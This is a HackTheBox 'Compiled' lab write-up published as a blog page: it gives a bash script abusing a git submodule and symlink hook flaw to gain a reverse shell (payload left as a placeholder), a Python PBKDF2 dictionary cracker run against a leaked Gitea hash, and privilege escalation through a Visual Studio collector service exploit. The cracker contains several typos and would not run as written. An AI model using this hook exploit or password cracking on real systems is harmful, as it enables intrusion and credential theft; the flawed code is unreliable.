@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Compiled 2f5b6b950d704581a461fd336e54e807 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Compiled 2f5b6b950d704581a461fd336e54e807" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Compiled" />
+<meta property="og:description" content="Compiled" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/12/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/12/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-12T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Compiled 2f5b6b950d704581a461fd336e54e807" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-12T16:05:57+00:00","datePublished":"2025-07-12T16:05:57+00:00","description":"Compiled","headline":"Compiled 2f5b6b950d704581a461fd336e54e807","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/12/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9.html"},"url":"https://your-site-url/writeups/2025/07/12/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Compiled 2f5b6b950d704581a461fd336e54e807</h1>
+  
+  <div class="post-date">
+    Published on 12 Jul 2025
+    
+  </div>
+  
+  <h1 id="compiled">Compiled</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start performing the corresponding nmap scan, there are 2 web applications running, one in 3000 and another in 5000</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled.png" alt="Untitled" /></p>
+
+<p>In 3000 there is a gitea service where we are able to log in</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_1.png" alt="Untitled" /></p>
+
+<p>In 5000 there is a compiler where we can enter a repository, first we test some unintended inputs, but it looks to be sanitized</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_2.png" alt="Untitled" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Having no more information we proceeded to create an account in the gitea service</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_3.png" alt="Untitled" /></p>
+
+<p>Effectively we can create new repositories</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_4.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_Untitled_5.png" alt="Untitled" /></p>
+
+<p>We also could see repositories other user’s</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image.png" alt="image.png" /></p>
+
+<p>A key part to find the foothold is the gitea version disclosed on the footer’s page, we searched gitea cves but we only found a stored XSS but the versions didn’t match pretty well</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_1.png" alt="image.png" /></p>
+
+<p>As we can see on gitea’s web page, and we can infer due to its name it is based on git, even when it is not so common we can search git vulnerabilities</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_2.png" alt="image.png" /></p>
+
+<p>There is a recent vulnerability, it could matching with what we are looking for</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_3.png" alt="image.png" /></p>
+
+<p>A blog explaining the CVE is in there but first at all let’s see whether it will be helpful</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_4.png" alt="image.png" /></p>
+
+<p>Looking around changelog version we realize it is running with a vulnerable version of git</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_5.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_6.png" alt="image.png" /></p>
+
+<p>Now we can focus a little bit more on the vulnerability, basically it is executing hooks without proper control in files called recursively, the issue is due to bad symbolic links handle by git.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c">#Configure Git to allow file protocol and enable symbolic links</span>
+
+<span class="c">#We need to allow file:// protocol to manage local repos</span>
+git config <span class="nt">--global</span> protocol.file.allow always
+<span class="c">#Allow symbolic links</span>
+git config <span class="nt">--global</span> core.symlinks <span class="nb">true</span>
+<span class="c">#Main will be the main branch (good practice to avoid master)</span>
+git config <span class="nt">--global</span> init.defaultBranch main
+
+<span class="c">#Clean up any existing repositories</span>
+<span class="nb">rm</span> <span class="nt">-rf</span> repo1
+<span class="nb">rm</span> <span class="nt">-rf</span> repo2
+
+<span class="c">#Clone the malicious repo</span>
+git clone &lt;repo1.git&gt;
+<span class="nb">cd </span>repo1
+
+<span class="c">#Create the malicious post-checkout hook</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> y/hooks
+<span class="c">##!bin/sh.exe could be executed when we have Git bash </span>
+<span class="c">#Or another unix terminal on windows</span>
+<span class="nb">cat</span> <span class="o">&gt;</span> y/hooks/post-checkout <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh">
+&lt;payload&gt;
+</span><span class="no">EOF
+</span><span class="nb">chmod</span> +x y/hooks/post-checkout
+
+<span class="c">#Add, commit and push the malicious hooks</span>
+git add y/hooks/post-checkout
+git commit <span class="nt">-m</span> <span class="s2">"Add malicious post-checkout hook"</span>
+git push
+<span class="nb">cd</span> ..
+
+<span class="c">#Clone another repo and set up the submodule</span>
+git clone &lt;repo2.git&gt;
+<span class="nb">cd </span>repo2
+<span class="c">#Creating a submodule named x/y in A/modules/x</span>
+<span class="c">#The submodule helps to keep the connection with other repositories</span>
+git submodule add <span class="nt">--name</span> x/y <span class="s2">"&lt;repo1.git&gt;"</span> A/modules/x
+git commit <span class="nt">-m</span> <span class="s2">"Add submodule"</span>
+
+<span class="c">#Create a symbolic link to the .git directory</span>
+<span class="c">#Only saving ".git" in a .txt, we are manipulating git</span>
+<span class="c">#Because it is in charge of manage which files are going to be commited</span>
+<span class="c">#That's how git is referenced indirectly</span>
+<span class="c">#y/hooks/post-checkout is part of this, and when we are cloning the repo</span>
+<span class="c">#the malicious hook is taken</span>
+<span class="nb">printf</span> <span class="s2">".git"</span> <span class="o">&gt;</span> dotgit.txt
+<span class="c">#Creating a git object and saving its hash</span>
+git hash-object <span class="nt">-w</span> <span class="nt">-stdin</span> &lt; dotgit.txt <span class="o">&gt;</span> dot-git.hash
+<span class="c">#Saving info in the index git format</span>
+<span class="c">#Mapping state and location of the index.info</span>
+<span class="nb">printf</span> <span class="s2">"1200 %s 0</span><span class="se">\t</span><span class="s2">a</span><span class="se">\n</span><span class="s2">"</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>dot-git.hash<span class="si">)</span><span class="s2">"</span> <span class="o">&gt;</span> index.info
+<span class="c">#Manipulating git index </span>
+git update-index <span class="nt">--index-info</span> &lt; index.info
+git commit <span class="nt">-m</span> <span class="s2">"Add symbolic link"</span>
+git push
+</code></pre></div></div>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_7.png" alt="image.png" /></p>
+
+<p>To make this exploit work, we need to create two empty repos</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_8.png" alt="image.png" /></p>
+
+<p>Execute the script</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_9.png" alt="image.png" /></p>
+
+<p>those are all the actions made</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_10.png" alt="image.png" /></p>
+
+<p>To trigger the rev shell we need to compile the repository in the web application previously mentioned</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_11.png" alt="image.png" /></p>
+
+<p>Now we have access as Richard</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_12.png" alt="image.png" /></p>
+
+<p>We found the gitea database, download it using python</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_13.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_14.png" alt="image.png" /></p>
+
+<p>There is a split pbdfkf2 up hash, it’s important to node that emily is the only one who needs change password, it might be due to a default password or due to a weak one</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_15.png" alt="image.png" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">binascii</span><span class="p">,</span> <span class="n">hashlib</span>
+
+<span class="c1">#Funcion to genereate the PBKDF3 hash from a password
+</span>
+<span class="k">def</span> <span class="nf">pbkdf2_hash</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">50000</span><span class="p">,</span> <span class="n">dklen</span><span class="o">=</span><span class="mi">50</span><span class="p">):</span>
+	<span class="c1">#Generating hash using SHA-256 as internal function
+</span>	<span class="n">hash_value</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">pbkdf2_hmac</span><span class="p">(</span>
+		<span class="s">'sha-256'</span><span class="p">,</span>
+		<span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span> <span class="c1">#Converting to bytes
+</span>		<span class="n">salt</span><span class="p">,</span>
+		<span class="n">iterations</span><span class="p">,</span> 
+		<span class="n">dklen</span><span class="o">=</span><span class="n">dklen</span>
+	<span class="p">)</span>
+	
+	<span class="k">return</span> <span class="n">hash_value</span>
+	
+<span class="k">def</span> <span class="nf">find_matching_password</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">50000</span><span class="p">,</span> <span class="n">dklen</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span>
+
+	<span class="c1">#Converting target hash to bytes
+</span>	<span class="n">target_hash_bytes</span><span class="o">=</span> <span class="n">binascci</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">targethash</span><span class="p">)</span>
+	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+		<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
+			<span class="c1">#Delete blank spaces
+</span>			<span class="n">password</span><span class="p">:</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+			
+			<span class="c1">#Generate the hash for the current password
+</span>			<span class="n">hash_value</span> <span class="o">=</span> <span class="n">pbdkf2_hash</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="p">,</span><span class="n">dklen</span><span class="p">)</span>
+			
+			<span class="c1">#Comparing hashes
+</span>			<span class="k">if</span> <span class="n">hash_value</span> <span class="o">==</span> <span class="n">target_hash_bytes</span><span class="p">:</span>
+				<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Found password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+				<span class="k">return</span> <span class="n">password</span>
+				
+		<span class="k">print</span><span class="p">(</span><span class="s">"Password not found"</span><span class="p">)</span>
+		<span class="k">return</span> <span class="bp">None</span>
+			
+<span class="c1">#COnverting salt to bytes
+</span><span class="n">salt</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">'227d873cca89103cd83a976bdac52486'</span><span class="p">)</span>
+<span class="n">target_hash</span> <span class="o">=</span> <span class="s">'97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16'</span> 
+<span class="n">dictionary_file</span> <span class="o">=</span> <span class="s">'/usr/share/wordlist/rockyou.txt'</span>
+
+<span class="n">find_matching_password</span><span class="p">(</span><span class="n">dictionary_file</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_16.png" alt="image.png" /></p>
+
+<p>Then are going to be able to open a session as emily and get the user flag</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_17.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_18.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_19.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>If we dig a little bit more in the machine we found that visual studio is installed, there is a recent vulnerability found in VSStandardCollectorService</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_20.png" alt="image.png" /></p>
+
+<p>We only need to fix the path where the exploit will search into VSDiagnostics</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_21.png" alt="image.png" /></p>
+
+<p>In visual studio 2022 we had need to add the W at the end of some statements</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_22.png" alt="image.png" /></p>
+
+<p>Set the payload to a new one with the path of the rev shell generated by msfvenom</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_23.png" alt="image.png" /></p>
+
+<p>To compile the project it is necessary to use Developer command prompt</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_24.png" alt="image.png" /></p>
+
+<p>Using cl set some initial parameters and get the .exe to execute</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_25.png" alt="image.png" /></p>
+
+<p>Use runnas to get system shell</p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_26.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9_image_27.png" alt="image.png" /></p>
+
+<p>Machine pwned!!! But this machine was a pain of head i don’t think it is a medium machine, i had a lot of problems compiling the CVE i saw on internet that there is a better way compiling it using MSBUILD but it will be part of another compiled machine. We also need to compile it in release mode.</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/12/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9.html';
+     this.page.identifier = '/writeups/2025/07/12/ed7f9d5f-d40e-4d0a-b9ae-5e083ab000d8-export-c53014af-0842-47be-bf08-def30d8508e9';
+     this.page.title = 'Compiled 2f5b6b950d704581a461fd336e54e807';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
